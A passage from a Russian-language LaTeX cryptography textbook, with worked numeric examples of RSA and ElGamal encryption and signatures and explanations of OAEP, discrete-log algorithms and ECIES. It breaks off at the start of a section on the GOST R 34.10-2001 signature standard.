Возведение числа в заданную степень $d$ выполняется с помощью последовательного \emph{возведения в квадрат и перемножения}. Пусть
    \[ d = d_0 + d_1 2^1 + d_2 2^2 + \ldots + d_{k-1} 2^{k-1} \]
двоичное представление с коэффициентами $d_{i} \in \{ 0, 1 \}$. Степень $c^d$ вычисляется рекуррентным образом:
  \[ c^d =((... (((c^ {d_{k-1}})^2  (c^{d_{k-2}}))^2)\dots(c^{d_2}))^2 (c^{d_1}))^2 (c^{d_0}).\]

%    \[ c^d = c^ {d_0} \cdot (c^2)^{d_1} \cdot (c^{2^2})^{d_2} \dots  (c^{2^{k-1}})^{d_{k-1}}, \]
Всего выполняется  $k-1$ операций возведения в квадрат и не более $k-1$ умножений, что считается легкой задачей.


\subsubsection{Пример схемы}

%\example
%Схема шифрования RSA.
\begin{enumerate}
    \item Генерирование параметров.
        \begin{enumerate}
            \item Выберем числа $p=13, q=11, n = 143$.
            \item Вычислим $\varphi(n) = (p-1)(q-1) = 12 \cdot 10 = 120$.
            \item Выберем $e=23: ~ \gcd(e, \varphi(n))=1, ~ e \in [2, 119]$.
            \item Найдем $d = e^{-1} \mod \varphi(n) = 23^{-1} \mod 120 = 47$.
            \item Открытый и секретные ключи:
                \[ \PK = (e:23, n:143), ~ \SK = (d:47). \]
        \end{enumerate}
    \item Шифрование.
        \begin{enumerate}
            \item Пусть сообщение $m = 22 \in [1, n-1]$.
            \item Вычислим шифротекст
                \[ c = m^e = 22^{23} = 55 \mod 143. \]
        \end{enumerate}
    \item Расшифрование.
        \begin{enumerate}
            \item Полученный шифротекст $c = 55$.
            \item Вычислим открытый текст
                \[ m = c^d = 55^{47} = 22 \mod 143. \]
        \end{enumerate}
\end{enumerate}

%Рассмотрим ее основные положения на примере криптосистемы с открытым ключом.
%Приведем общую схему алгоритма RSA.
%$C_i=M_{i}^{E_k}(mod N_j)$
%$N_j=P_{j}Q_{j}$
%$M_i=C_{i}^{D_k}(mod N_j)$
%$E_k\neq D_k$
%Вычислить $E_k$ из $D_k$  при длине блока сообщения  $L_{блока} > L_{дополнения}$ можно только с экспоненциальной сложностью. $E_k D_K=1(mod \varphi(N_j))$
%Данное сравнение не дает единственного решения. Решение данного сравнения и можно свести к следующему уравнению:
%$ax+by=1$
%$E_k D_k=k \varphi(N_j)+1$
%$1\leq E_k D_k <\varphi(N_j)$
%$\varphi(N_j)(-k)+ E_k D_k=1$
%Стандарт ISO X.509 определяет требования по реализации алгоритма RSA, в частности, требования к общесистемным параметрам и ключам, методы распространения сертификатов ключей и ключевых параметров, а также порядок ввода их в действие и многое другое.


\subsection[Электронная подпись]{Электронная подпись RSA}

Предположим, что пользователь $A$ сообщения не шифрует, но хочет посылать свои сообщения в виде открытых текстов с подписью. Для этого надо создать электронную подпись (ЭП). Это можно сделать, используя систему RSA. При этом должны быть выполнены следующие требования:
\begin{itemize}
    \item вычисление подписи от сообщения является вычислительно легкой задачей;
    \item фальсификация подписи при неизвестном секретном ключе -- вычислительно трудная задача;
    \item подпись должна быть проверяемой открытым ключом.
\end{itemize}

Создание параметров ЭП RSA производится так же, как и для схемы шифрования RSA. Пусть  $A$ имеет секретный ключ $\SK = (d)$, а получатель (проверяющий) $B$ -- открытый ключ $\PK = (e,n)$ пользователя $A$.

\begin{enumerate}
    \item $A$ вычисляет подпись сообщения $m \in [1,n-1]$ как
        \[ s = m^{d} \mod n \]
        на своем секретном ключе $\SK$.
    \item $A$ посылает $B$ сообщение в виде $(m, s)$, где $m$ -- открытый текст, $s$ -- подпись.
    \item $B$ принимает сообщение $(m, s)$, возводит $s$ в степень $e$ по модулю $n$ ($e, n$ -- часть открытого ключа). В результате вычислений $B$ получает открытый текст
        \[ \left( m^{d} \mod n \right)^{e} \mod n = m. \]
    \item Сравнивает полученное значение с первой частью сообщения. При полном совпадении подпись принимается.
\end{enumerate}
Недостаток этой системы создания ЭП состоит в том, что подпись $m^{d} \mod n$ имеет большую длину, равную длине открытого сообщения $m$.

Для уменьшения длины подписи применяется другой вариант процедуры: вместо сообщения $m$ отправитель подписывает $h(m)$, где $h(x)$ -- известная криптографическая хэш-функция. Модифицированная процедура состоит в следующем.

\begin{enumerate}
    \item $A$ посылает $B$ сообщение в виде $(m, s)$, где $m$ -- открытый текст,
        \[ s = h(m)^d \mod n \]
        подпись.
    \item $B$ принимает сообщение $(m, s)$, вычисляет хэш $h(m)$ и возводит подпись в степень
        \[ h_1 = s^e \mod n. \]
    \item $B$ сравнивает значения $h(m)$ и $h_1$. При равенстве
        \[ h(m) = h_1 \]
        подпись считается подлинной, при неравенстве -- фальсифицированной.
\end{enumerate}


\subsubsection{Пример схемы}

\begin{enumerate}
    \item Генерирование параметров.
        \begin{enumerate}
            \item Выберем $p=13, q=17, n = 221$.
            \item Вычислим $\varphi(n) = (p-1)(q-1) = 12 \cdot 16 = 192$.
            \item Выберем $e=25: ~ \gcd(e = 25, \varphi(n) = 192) = 1, \\
                e \in [2, \varphi(n) - 1 = 191]$.
            \item Найдем $d = e^{-1} \mod \varphi(n) = 25^{-1} \mod 192 = 169$.
            \item Открытый и секретные ключи:
                \[ \PK = (e:25, n:221), ~ \SK = (d:169). \]
        \end{enumerate}
    \item Подписание.
        \begin{enumerate}
            \item Пусть хэш сообщения $h(m) = 12 \in [1, n-1]$.
            \item Вычислим ЭП
                \[ s = h^d = 12^{169} = 90 \mod 221. \]
        \end{enumerate}
    \item Проверка подписи.
        \begin{enumerate}
            \item Пусть хэш полученного сообщения $h(m) = 12$, полученная подпись $s = 90$.
            \item Выполним проверку
                \[ h_1 = s^e = 90^{25} = 12 \mod 221, ~~ h_1 = h, \]
                подпись верна.
        \end{enumerate}
\end{enumerate}


\subsection[Рандомизация шифрования и ЭП]{Рандомизация шифрования и \protect\\ подписания RSA}

\textbf{Семантически безопасной}\index{криптосистема!семантически-безопасная} называется криптосистема, для которой вычислительно невозможно извлечь любую информацию из шифротекстов, кроме длины шифротекста. Алгоритм RSA не является семантически безопасным. Одинаковые сообщения шифруются одинаково и, следовательно, применима атака на различение сообщений.

Кроме того, сообщения длиной менее $\frac{k}{3}$ бит, зашифрованные на малой экспоненте $e=3$, \emph{дешифруются} нелегальным пользователем извлечением обычного кубического корня.

В приложениях RSA используется только в сочетании с рандомизацией\index{рандомизация шифрования}. В стандарте PKCS\#1 RSA Laboratories описана схема рандомизации перед шифрованием OAEP-RSA (Optimal Asymmetric Encryption Padding). Примерная схема:
\begin{enumerate}
    \item Выбирается случайное $r$.
    \item Для открытого текста $m$ вычисляется
        \[ x = m \oplus H_1(r), ~ y = r \oplus H_2(x), \]
        где $H_1$ и $H_2$ -- криптографические хэш-функции.
    \item Сообщение $M = x \| y$ далее шифруется RSA.
\end{enumerate}
Восстановление $m$ из $M$ при расшифровании:
    \[ r = y \oplus H_2(x), ~ m = x \oplus H_1(r). \]

В модификации OAEP+ $x$ вычисляется как
    \[ x = (m \oplus H_1(r)) \| H_3(m \| r). \]

В описанной выше схеме ЭП под $m$ понимается хэш открытого текста, вместо шифрования выполняется подписание, вместо расшифрования -- проверка подписи.


\subsection{Выбор параметров и оптимизация}

\subsubsection{Выбор экспоненты $e$}

В случайно выбранной экспоненте $e$ c битовой длиной $k = \lceil \log_2 e \rceil$ половина бит в среднем равна 0, половина -- 1. При возведении в степень $m^e \mod n$ по методу <<возводи в квадрат и перемножай>> получится $k-1$ возведений в квадрат и, в среднем,
 $\frac{1}{2}(k-1)$ умножений.

Если выбрать $e$, содержащим малое число единиц в двоичной записи, то число умножений уменьшится до числа единиц в $e$.

Часто экспонента $e$ выбирается  \emph{малым} \emph{простым} числом и/или содержащим малое число единиц в битовой записи, для ускорения шифрования или проверки подписи, например:
\[
    \begin{array}{l}
        3 = [11]_2, \\
        17 = 2^4+1 = [10001]_2, \\
        257 = 2^8+1 = [100000001]_2, \\
        65537 = 2^{16}+1 = [10000000000000001]_2.
    \end{array}
\]

%Время шифрования или проверки подписи для малых экспонент становится $O(k^2)$ вместо $O(k^3)$, то есть в сотни раз быстрее для 1000-битовых чисел.


\subsubsection[Ускорение шифрования]{Ускорение шифрования по китайской \protect\\ теореме об остатках}

Возводя $m$ в степень $e$ отдельно по $\mod p$ и $\mod q$ и применяя китайскую теорему об остатках (Chinese remainder theorem, CRT), можно шифрование выполнить быстрее.

Однако ускорение шифрования в криптосистеме RSA через CRT может привести к уязвимостям в некоторых применениях, например, в смарт-картах.

\example
Пусть $c = m^e \mod n$ передается на расшифрование на смарт-карту, где вычисляется
\[ \begin{array}{c}
    m_p = c^d \mod p, \\
    m_q = c^d \mod q, \\
    m = m_p q (q^{-1} \mod p) + m_q p (p^{-1} \mod q) \mod n. \\
\end{array} \]
Криптоаналитик внешним воздействием может вызвать сбой во время вычисления $m_p$ (или $m_q$), в результате получится $m_p'$ и $m'$ вместо $m$. Зная $m_p'$ и $m'$ криптоаналитик находит разложение числа $n$ на множители $p,q$:
    \[ \gcd(m' - m, ~ n) = \gcd( (m_p' - m) q (q^{-1} \mod p), ~ pq) = q. \]
\exampleend


\subsubsection{Длина ключей}

В 2005 году было разложено 663-битовое число вида RSA. Время разложения в эквиваленте составило 75 лет вычислений одного ПК. Самые быстрые алгоритмы факторизации -- субэкспоненциальные\index{задача!факторизации}. Минимальная рекомендуемая длина модуля $n$ -- 1024 бит, но лучше использовать 2048 или 4096 бит.

В приложении показано, что битовая сложность (количество битовых операций) вычисления произвольной степени $a^b \mod n$ является кубической $O(k^3)$, а возведения в квадрат $a^2 \mod n$ и умножения $a b \mod n$ -- квадратичными $O(k^2)$, где $k$ -- битовая длина чисел $a,b,n$.

%Увеличение длины модуля $n$ в 2 раза увеличивает время возведения в степень в $2^3$ раз для большой экспоненты $e$, а для маленькой экспоненты -- в $2^2$ раза.


\section{Криптосистема Эль-Гамаля}\index{криптосистема!Эль-Гамаля|(}
\selectlanguage{russian}

Эта система шифрования с открытым ключом опубликована в 1985 году Эль-Гамалем (Taher El Gamal, \cite{ElGamal:1985}). Рассмотрим принципы ее построения.

Пусть имеется мультипликативная группа $\Z_p^* = \{1, 2, \dots, p-1\}$, где $p$ -- большое простое\index{число!простое} число, содержащее не менее 1024 двоичных разряда. В  группе $\Z_p^*$ существует $\varphi( \varphi( p ) ) = \varphi( p - 1 )$ элементов, которые порождают все элементы группы. Такие элементы называются генераторами.\footnote{Подробнее см. раздел~\ref{section-groups} в приложении.}

Выберем один из таких генераторов $g$ и целое число $x$ в интервале $1 \le x \le p-1$. Вычислим:
    \[ y = g^x \mod p. \]

Хотя элементы $x$ и $y$ группы $\Z_p^*$ задают друг друга однозначным образом, найти $y$ зная $x$ просто, а вот эффективного алгоритма для получения $x$ по $y$ неизвестно. Говорят, что задача вычисления дискретного логарифма
	\[ x = \log_g y \mod p \]
является вычислительно сложной задачей. На сложности вычисления дискретного логарифма для больших простых $p$ основывается криптосистема Эль-Гамаля.

\subsection{Шифрование}\index{шифр!Эль-Гамаля|(}

Процедура шифрования в криптосистеме Эль-Гамаля состоит из следующих операций.

\begin{enumerate}
    \item \textbf{Создание пары из закрытого и открытого ключей стороной $A$.}
        \begin{enumerate}
            \item $A$ выбирает простое\index{число!простое} случайное число $p$.
            \item Выбирает генератор $g$ (в программных реализациях алгоритма генератор часто выбирается малым числом, например $g = 2 \mod p$).
            \item Выбирает $x \in [2, p - 1]$ с помощью генератора случайных чисел.
            \item Вычисляет $y=g^{x}\mod p$.
            \item Создаёт закрытый и открытые ключи $\SK$ и $\PK$:
                \[ \SK = (p, g, x), ~ \PK = (p, g, y). \]
                Криптостойкость задаётся битовой длиной параметра $p$.
        \end{enumerate}
    \item \textbf{Шифрование на открытом ключе стороной $B$.}
        \begin{enumerate}
            \item Стороне $B$ известен открытый ключ $\text{PK} = (p, g, y)$ стороны $A$.
            \item Сообщение представляется числом $m \in [0, p-1]$.
            \item Выбирает случайное число $r \in [1, p-1]$ и вычисляет
                \[ \begin{array}{l}
                    a = g^r \mod p, \\
                    b = m \cdot y^r \mod p.
                \end{array} \]
            \item Создаёт шифрованное сообщение в виде
                \[ c = (a, b) \]
                и посылает стороне $A$.
        \end{enumerate}
    \item \textbf{Расшифрование на закрытом ключе стороной $A$.}

	Получив сообщение $(a, b)$ и владея закрытым ключом $\text{SK} = (p, g, x)$, $A$ вычисляет
                \[ m = \frac{b}{a^x} \mod p. \]
\end{enumerate}

Шифрование корректно, так как 
\[ \begin{array}{l}
    m' = \frac{b}{a^x} = \frac{m y^r}{g^{rx}} = m \mod p, \\
    m' \equiv m \mod p.
\end{array} \]

Чтобы криптоаналитику получить исходное сообщение $m$ из шифротекста $(a, b)$, зная только открытый ключ получателя $\text{PK} = (p, g, y)$, нужно вычислить значение $m = b \cdot y^{-r} \mod p$. Для этого криптоаналику нужно найти случайный параметр $r = \log_g a \mod p$, то есть вычислить дискретный логарифм. Такая задача является вычислительно сложной.

\example Создание ключей, шифрование и расшифрование в криптосистеме Эль-Гамаля.

\begin{enumerate}
    \item Генерирование параметров.
        \begin{enumerate}
            \item Выберем $p=41$.
            \item Группа $\Z_p^*$ циклическая, найдём генератор (примитивный элемент). Порядок группы
                \[ |\Z_p^*| = \varphi(p) = p-1 = 40. \]
                Делители 40: 2, 4, 5, 8, 10, 20. Элемент группы является примитивным, если все его степени, соответствующие делителям порядка группы, не сравнимы с 1. Из табл.~\ref{tab:elgamal-generator-search} видно, что число $g = 6$ является генератором всей группы.
                \begin{table}[!ht]
                    \centering
                    \caption{Поиск генератора в циклической группе $\Z_{41}^*$. Элемент 6 -- генератор\label{tab:elgamal-generator-search}}
                    \resizebox{\textwidth}{!}{ \begin{tabular}{|c|c|c|c|c|c|c|c|c|}
                        \hline
                        \multirow{2}{*}{Элемент} & \multicolumn{7}{|c|}{Степени} & \multirow{2}{*}{Порядок элемента} \\
                        \cline{2-8}
                                & 2   & 4   & 5   & 8  & 10 & 20 & 40 & \\
                        \hline
                        2       & 4   & 16  & -9  & 10 & -1 & 1  &    & 20 \\
                        3       & 9   & -1  & -3  & 1  &    &    &    & 8 \\
                        5       & -16 & 10  & 9   & 18 & -1 & 1  &    & 20 \\
                        6       & -5  & -16 & -14 & 10 & -9 & -1 & 1  & 40 \\
                        \hline
                    \end{tabular} }
                \end{table}
            \item Выберем случайное $x = 19 \in [1, p-1]$.
            \item Вычислим
                \[ \begin{array}{ll}
                    y & = g^x \mod p = \\
                    & = 6^{19} \mod 41 = \\
                    & = 6^{1 + 2 + 4 \cdot 0 + 8 \cdot 0 + 16} \mod 41 = \\
                    & = 6^1 \cdot 6^2 \cdot 6^{4 \cdot 0} \cdot 6^{8 \cdot 0} \cdot 6^{16} \mod 41 = \\
                    & = 6 \cdot (-5) \cdot (-16)^0 \cdot 10^0 \cdot 18 \mod 41 = \\
                    & = -7 \mod 41.
                \end{array} \]
            \item Открытый и закрытый ключи:
                \[ \PK = (p:41, g:6, y:-7), ~ \SK = (p:41, g:6, x:19). \]
        \end{enumerate}
    \item Шифрование.
        \begin{enumerate}
            \item Пусть сообщением является число $m = 3 \in \Z_p^*$.
            \item Выберем случайное число $r = 25 \in [1, p-1]$.
            \item Вычислим
                \[ \begin{array}{l}
                    a = g^r \mod p = 6^{25} \mod 41 = 14 \mod 41, \\
                    b = m y^r \mod p = 3 \cdot (-7)^{25} \mod 41 = -9 \mod 41.
                \end{array} \]
            \item Шифротекстом является пара чисел
                \[ c = (a:14, ~ b:-9). \]
        \end{enumerate}
    \item Расшифрование.
        \begin{enumerate}
            \item Пусть получен шифротекст
                \[ c = (a:14, ~ b:-9). \]
            \item Вычислим открытый текст как
                \[ \begin{array}{ll}
                    m & = \frac{b}{a^x} \mod p = \\
                    & = -9 \cdot (14^{-1})^{19} \mod 41 = \\
                    & = -9 \cdot 3^{19} \mod 41 = \\
                    & = -9 \cdot (-14) \mod 41 = \\
                    & = 3 \mod 41. \\
                \end{array} \]
        \end{enumerate}
\end{enumerate}

\exampleend
\index{шифр!Эль-Гамаля|)}

\subsection{Электронная подпись}\index{электронная подпись!Эль-Гамаля|(}

Криптосистема Эль-Гамаля, как и криптосистема RSA\index{криптосистема!RSA}, может быть использована для создания электронной подписи.

По-прежнему имеются два пользователя $A$ и $B$ и незащищённый канал связи между ними. Пользователь $A$  хочет подписать свое открытое сообщение $m$  для того, чтобы пользователь $B$ мог убедиться, что именно $A$ подписал сообщение.

Пусть $A$ имеет закрытый ключ $\SK = (p, g, x)$, открытый ключ $\PK = (p, g, y)$ (полученные так же, как и в системе шифрования Эль-Гамаля) и хочет подписать открытое сообщение. Обозначим подпись $S(m)$.

Для создания подписи $S(m)$ пользователь $A$ выполняет следующие операции:
\begin{itemize}
    \item вычисляет значение криптографической хэш-функции  $h(m) \in [0,p-2]$ от своего открытого сообщения $m$;
    \item выбирает случайное число $r, ~ \gcd(r, p-1)=1$;
    \item используя закрытый ключ, вычисляет
        \[ \begin{array}{l}
            a = g^r \mod p, \\
            b = \frac{h(m) - xa}{r} \mod (p-1); \\
        \end{array} \]
    \item создаёт подпись в виде двух чисел
        \[ S(m) = (a, b) \]
        и посылает сообщение с подписью $(m, S(m))$.
\end{itemize}

Получив сообщение, $B$ осуществляет проверку подписи, выполняя следующие операции:
\begin{itemize}
    \item по известному сообщению $m$ вычисляет значение хэш-функции $h(m)$;
    \item вычисляет
        \[ \begin{array}{l}
            f_1 = g^{h(m)} \mod p, \\
            f_2 = y^a a^b \mod p; \\
        \end{array} \]
    \item сравнивает значения $f_1$ и $f_2$, если
        \[ f_1 = f_2, \]
        то подпись подлинная, в противном случае -- фальсифицированная (или случайно испорченная).
\end{itemize}

Покажем, что проверка подписи корректна. По малой теореме Ферма получаем
\[ \begin{array}{ll}
    f_1 & = g^{h(m)} \mod p = \\
    & \\
    & = g^{h(m) \mod (p-1)} \mod p; \\
\end{array} \] \[ \begin{array}{ll}
    f_2 & = y^a a^b \mod p = \\
    & = \underbrace{\left( g^x \right)^a}_{y^a} \cdot
        \underbrace{\left( g^r \mod p \right)^{\frac{h(m) - xa}{r} \mod (p-1)}}_{a^b} \mod p = \\
    & \\
    & = g^{xa \mod (p-1)} ~\cdot~ g^{h(m) - xa \mod (p-1)} \mod p = \\
    & = g^{h(m) \mod (p-1)} \mod p = \\
    & = f_1.
\end{array} \]

\example Создание и валидация электронной подписи в криптосистеме Эль-Гамаля.

\begin{enumerate}
    \item Генерирование параметров.
        \begin{enumerate}
            \item Выберем $p=41$.
            \item Выберем генератор $g=6$ в группе $\Z_{41}^*$.
            \item Выберем случайное $x = 19 \in [1, p-1]$.%, ~ \gcd(x, p-1) = 1$.
            \item Вычислим
                \[ \begin{array}{ll}
                    y & = g^x \mod p = \\
                    & = 6^{19} \mod 41 = \\
                    & = 6^{1 + 2 + 4 \cdot 0 + 8 \cdot 0 + 16} \mod 41 = \\
                    & = 6 \cdot (-5) \cdot (-16)^0 \cdot 10^0 \cdot 18 \mod 41 = \\
                    & = -7 \mod 41. \\
                \end{array} \]
            \item Открытый и закрытый ключи:
                \[ \PK = (p:41, g:6, y:-7), ~ \SK = (p:41, g:6, x:19). \]
        \end{enumerate}
    \item Подписание.
        \begin{enumerate}
            \item От сообщения $m$ вычисляется хэш $h = H(m)$. Пусть хэш $h  = 3 \in [0, p-2]$.
            \item Выберем случайное $r = 9 \in [1, p-2]$: \\
                $\gcd(r=9, p-1 = 40) = 1$.
            \item Вычислим
                \[ \begin{array}{ll}
                    a & = g^r \mod p = \\
                      & = 6^9 \mod 41 = 19 \mod 41, \\
                    b & = \frac{h - xa}{r} \mod (p-1) = \\
                      & = (3 - 19 \cdot 19) \cdot 9^{-1} \mod 40 = \\
                      & = 2 \cdot 9 \mod 40 = 18 \mod 40. \\
                \end{array} \]
            \item Подпись
                \[ s = (a:19, b:18). \]
        \end{enumerate}
    \item Проверка подписи.
        \begin{enumerate}
            \item Для полученного сообщения находится хэш $h = H(m) = 3$. Пусть полученная подпись к нему имеет вид
                \[ s = (a:19, b:18). \]
            \item Вычислим
                \[ \begin{array}{ll}
                    f_1 & = g^h \mod p = \\
                        & = 6^3 \mod 41 = 11 \mod 41, \\
                    f_2 & = y^a a^b \mod p = \\
                        & = (-7)^{19} \cdot 19^{18} \mod 41 = 11 \mod 41. \\
                \end{array} \]
            \item Проверим равенство $f_1$ и $f_2$. Подпись верна, так как
                \[ f_1 = f_2 = 11. \]
        \end{enumerate}
\end{enumerate}

\exampleend
\index{электронная подпись!Эль-Гамаля|)}

\subsection{Криптостойкость}

Пусть дано уравнение $y=g^{x} \mod p$, требуется определить $x$ в интервале $0 < x < p-1$. Задача называется \textbf{дискретным логарифмированием}\index{задача!дискретного логарифмирования}.

Рассмотрим возможные способы нахождения неизвестного числа $x$. Начнем с перебора различных значений $x$ из интервала $0<x<p-1$ и проверки равенства $y=g^{x} \mod p$. Число попыток в среднем равно $\frac{p}{2}$, при $p=2^{1024}$ это число равно $2^{1023}$, что на практике не осуществимо.

Другой подход предложен советским математиком Гельфондом\index{алгоритм!Гельфонда} безотносительно к криптографии. Он состоит в следующем.
Вычислим $S=\lceil\sqrt{p-1}\rceil $, где скобки означают ближайшее (сверху) целое от числа $\sqrt{p-1} $.

Представим искомое число $x$   в следующем виде

\begin{equation}
    x=x_{1} S+x_{2},
    \label{S}
\end{equation}

где $x_{1}$ и $x_{2}$ -- целые неотрицательные числа,
    \[ x_{1} \le S-1, ~ x_{2} \le S-1. \]
Такое представление является однозначным.

Вычислим и занесем в таблицу следующие $S$  чисел:
    \[ g^{0} \mod p, ~~ g^{1} \mod p, ~~ g^{2} \mod p, ~~ \dots, ~~ g^{S-1} \mod p. \]
Вычислим $g^{-S} \mod p$ и также занесем в таблицу.

\begin{center} \begin{tabular}{|l|c|c|c|c|c|c|}
    \hline
    $\lambda $ & 0 & 1 & 2 & \dots & $S-1$ & $-S$ \\
    \hline
    $g^{\lambda} \mod p$ & $g^{0}$ & $g^{1}$ & $g^{2}$ & \dots & $g^{S-1}$ & $g^{-S}$ \\
    \hline
\end{tabular} \end{center}

Для решения уравнения~\ref{S} используем перебор значений $x_{1}$.
\begin{enumerate}
    \item Предположим, что $x_{1} = 0$. Тогда $x = x_{2}$. Если число $y = g^{x_{2}} \mod p$ содержится в таблице, то находим его и выдаём результат: $x=x_{2} $. Задача решена. В противном случае переходим к пункту 2.
    \item Предположим, что $x_{1} =1$. Тогда $x=S+x_{2} $ и $y=g^{S+x_{2}} \mod p$. Вычисляем $yg^{-S} \mod p=g^{x_{2}} \mod p$. Задача сведена к предыдущей: если $g^{x_{2} } \mod p$ содержится в таблице, то в таблице находим число $x_{2} $ и выдаём результат $x$: $x=S+x_{2} $.
    \item Предположим, что $x_{1} =2$. Тогда $x=2S+x_{2} $ и $y=g^{2S+x_{2} } \mod p$. Если число $yg^{-2S} \mod p=g^{x_{2} } \mod p$ содержится в таблице, то находим число $x_{2}$ и выдаём результат: $x = 2S + x_{2}$.
     \item Пробегая все возможные значения, доберемся, в худшем случае, до $x_{1} =S-1$. Тогда $x=(S-1)S+x_{2} $ и $y = g^{(S-1)S+x_{2} } \mod p$. Если число $yg^{-(S-1)S} \mod p=g^{x_{2}} \mod p$ содержится в таблице, то находим его и выдаём результат: $x=(S-1)S+x_{2}$.
\end{enumerate}

Легко проверить, что с помощью построенной таблицы мы проверили все возможные значения $x$. Максимальное число умножений равно $2S \approx 2\sqrt{p-1} =2\times 2^{512} $, что для практики очень велико. Тем самым проблему достаточной криптостойкости этой системы можно было бы считать решенной. Однако, это не верно, так как числа $p-1$ являются составными. Если  $p-1$ можно разложить на маленькие множители, то криптоаналитик может применить процедуру, подобную процедуре Гельфонда, по взаимно простым делителям  $p-1$  и найти секрет. Пусть  $p-1=st$. Тогда элемент $g^s$ образует подгруппу порядка $t$ и наоборот. Теперь, решая уравнение $y^s=(g^s)^a\mod p$, находим вычет $x=a\mod t$. Поступая аналогично, находим $x=b\mod s$ и по Китайской теореме об остатках находим $x$.

Несколько позже подобный метод ускоренного решения уравнения~\ref{S} был предложен Шенксом (Daniel Shanks, \cite{Shanks:1971})\index{алгоритм!Шенкса}.

Пусть $k = \lceil \log_2 p \rceil$ -- битовая длина числа $p$. Алгоритм Гельфонда имеет экспоненциальную сложность (число двоичных операций)
    \[ O(\sqrt{p}) = O(e^{\frac{1}{2} \frac{1}{\log_2 e} k}). \]

Наилучшие из известных алгоритмов решения задачи дискретного логарифмирования имеют экспоненциальную сложность порядка
    \[ O(e^{\sqrt{k}}). \]

\index{криптосистема!Эль-Гамаля|)}


\section{Эллиптические кривые}\label{section-elliptic-curve-cryptosystems}
\selectlanguage{russian}

Существуют аналоги криптосистемы Эль-Гамаля, в которых вместо проблемы дискретного логарифма в мультипликативных полях используется проблема дискретного логарифма в группах точек эллиптических кривых над конечными полями (обычно $GF(p)$ либо $GF(2^n)$). Математическое описание данных полей приведено в разделе~\ref{section-math-ec-groups}. Нас же интересует следующий факт: для группы точек эллиптической кривой над конечным полем $\group{E}$ существует быстро выполнимая операция~-- умножение целого числа $x$ на точку $A$ (суммирование точки самой с собой целое число раз):
\[ \begin{array}{l}
	x \in \group{Z}, \\
	A, B \in \group{E}, \\
	B = x \times A. \\
\end{array} \]

И получение исходной точки $A$ при известных $B$ и $x$ (<<деление>> точки на целое число), и получение целого числа $x$ при известных $A$ и $B$ являются сложными задачами. На этом и основаны алгоритмы шифрования и электронной подписи с использованием эллиптических кривых над конечными полями.

\subsection{ECIES}
\selectlanguage{russian}

Схема ECIES (\langen{Elliptic Curve Integrated Encryption Scheme}) является частью сразу нескольких стандартов, в том числе ANSI X9.63, IEEE 1363a, ISO 18033-2 и SECG SEC 1. Эти стандарты по-разному описывают выбор параметров схемы~\cite{Martinez:Encinas:Avila:2010}:

\begin{itemize}
	\item ENC (\langen{Encryption}) -- блочный режим шифрования (в том числе простое гаммирование, 3DES\index{шифр!3DES}, AES\index{шифр!AES}, MISTY1\index{шифр!MISTY1}, CAST-128\index{шифр!CAST-128}, Camelia\index{шифр!Camelia}, SEED\index{шифр!SEED});
	\item KA (\langen{Key Agreement})~-- метод для генерации общего секрета двумя сторонами (оригинальный метод, описанный в протоколе Диффи~--~Хеллмана\index{протокол!Диффи~--~Хеллмана}~\cite{Diffie:Hellman:1976}, либо его модификации~\cite{Miller:1986});
	\item KDF (\langen{Key Derivation Function}) -- метод получения ключей из ключевой и дополнительной информации;
	\item HASH~--- криптографическая хэш-функция (SHA-1\index{хэш-функция!SHA-1}, SHA-2\index{хэш-функция!SHA-2}, RIPEMD\index{хэш-функция!RIPEMD}, SHA-1\index{хэш-функция!WHIRLPOOL});
	\item MAC (\langen{Message Authentication Code})~--- функция вычисления имитовставки\index{имитовставка} (DEA, ANSI X9.71, MAC1, HMAC-SHA-1, HMAC-SHA-2, HMAC-RIPEMD, CMAC-AES).
\end{itemize}

К параметрам относится выбор группы точек над эллиптической кривой $\group{E}$, а также некоторой большой циклической подгруппы $\group{G}$ в группе $\group{E}$, задаваемой точкой-генератором $G$. Мощность циклической группы обозначается $n$.
\[n = \left\| \group{G} \right\|.\]

Предположим, что в нашем сценарии Алиса хочет послать сообщение Бобу. У Алисы есть открытый ключ Боба $P_B$, а у Боба ~--- соответствующий ему закрытый ключ $p_B$. Для отправки сообщения Алиса также сгенерирует временную (\langen{ephemeral}) пару из открытого ($P_A$) и закрытого ($p_A$) ключей. Закрытыми ключами являются некоторые натуральные числа, меньшие n, а открытыми ключами является произведение закрытого на точку-генератор $G$:

\[ \begin{array}{ll}
	p_A \in \Z, & p_B \in \Z, \\
	1 < p_A < n, & 1 < p_B < n, \\
	P_A = p_A \times G, & P_B = p_B \times G, \\
	P_A \in \group{G} \in \group{E}, & P_B \in \group{G} \in \group{E}.\\
\end{array} \]

\begin{enumerate}
	\item С помощью метода генерации общего секрета KA, Алиса вычисляет общий секрет $s$. В случае использования оригинального протокола Диффи~--~Хеллмана\index{протокол!Диффи~--~Хеллмана} общим секретом будет является результат умножения закрытого ключа Алисы на открытый ключ Боба $s = p_a \times P_B$.
	\item Используя полученный общий секрет $s$ и метод получения ключей из ключевой и дополнительной информации KDF Алиса получает ключ шифрования $k_{ENC}$, а также ключ для вычисления имитовставки $k_{MAC}$.
	\item С помощью симметричного алгоритма шифрования ENC Алиса шифрует открытое сообщение $m$ ключом $k_{ENC}$ и получает шифротекст $c$.
	\item Взяв ключ $k_{MAC}$, зашифрованное сообщение $c$ и другие заранее обговоренные сторонами параметры, Алиса вычисляет тэг сообщения ($tag$) с помощью функции MAC.
	\item Алиса отсылает Бобу $\{P_A, tag, c\}$.
\end{enumerate}

В процессе дешифровки Боб последовательно получает общий секрет $s = p_b \times P_A$, ключи шифрования $k_{ENC}$ и имитовставки $k_{MAC}$, вычисляет тэг сообщения и сверяет его с полученным. В случае совпадения вычисленного и полученного тэгов Боб расшифровывает исходное сообщение $m$ из шифротекста $c$ с помощью ключа шифрования $k_{ENC}$.


\section[Российский стандарт ЭП ГОСТ Р 34.10-2001]{Российский стандарт ЭП \protect\\ ГОСТ Р 34.10-2001}
\selectlanguage{russian}

Российский стандарт цифровой подписи основан на криптосистеме типа Эль-Гамаля\index{криптосистема!Эль-Гамаля}, в которой в качестве группы используется группа точек эллиптической кривой над конечным полем (см. Приложение). Группа должна быть большой с количеством элементов порядка $2^{255}$.

Пусть имеются две стороны $A$ и $B$ и между ними канал связи. Сторона $A$ желает передать сообщение $M$ стороне $B$ и подписать его. Сторона $B$ должна проверить правильность подписи, то есть аутентифицировать сторону $A$.

$A$ формирует открытый ключ следующим образом.

\begin{enumerate}
    \item Выбирает простое число $p > 2^{255}$.
    \item Записывает уравнение эллиптической кривой
        \[ E: ~ y^2 = x^3 + a x + b \mod p, \]
        которое определяет группу точек эллиптической кривой $\E(\Z_p)$.
